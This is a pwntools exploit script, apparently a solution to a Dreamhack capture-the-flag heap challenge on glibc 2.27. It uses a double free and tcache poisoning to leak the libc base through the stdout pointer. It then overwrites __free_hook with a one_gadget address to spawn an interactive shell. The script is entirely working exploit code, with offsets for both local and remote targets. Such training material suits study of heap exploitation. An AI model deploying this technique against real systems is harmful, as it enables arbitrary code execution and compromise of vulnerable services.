from pwn import *

p = process("./tcache_poison_patched")
#p = remote("host3.dreamhack.games", 18280)
e = ELF("./tcache_poison_patched")
#libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
libc = ELF("./libc-2.27.so")
gdb.attach(p,gdbscript=
           '''
           b*0x00000000004007d5
           b*0x0000000000400830
           b*0x000000000040083d
           b*0x000000000040086b
           b*0x0000000000400879
           b*0x0000000000400893
           b*0x00000000004008bf
           ''')

def allocate(size, content):
    p.sendlineafter("Edit\n", "1")
    p.sendlineafter(": ", str(size))
    p.sendafter(": ", content)

def free():
    p.sendlineafter("Edit\n", "2")

def print_chunk():
    p.sendlineafter("Edit\n", "3")

def edit(content):
    p.sendlineafter("Edit\n", "4")
    p.sendafter(": ", content)

allocate(0x30, "dreamhack")
free()

edit("A"*0x8 + "B")
free()

addr_stdout = e.symbols["stdout"]
allocate(0x30, p64(addr_stdout))

allocate(0x30, "BBBBBBBB")
allocate(0x30, "\x60")
input()
print_chunk()

p.recvuntil("Content: ")
stdout = u64(p.recvn(6).ljust(8, b"\x00"))
lb = stdout - libc.symbols["_IO_2_1_stdout_"]
#local
og = lb + 0x4f302
#remote
#og = lb + 0x4f432
free_hook = lb + libc.symbols["__free_hook"]

allocate(0x40, "dreamhack")
free()

edit("A"*0x8 + "\x00")
free()

allocate(0x40, p64(free_hook))

allocate(0x40, "BBBBBBBB")
allocate(0x40, p64(og))

free()

p.interactive()
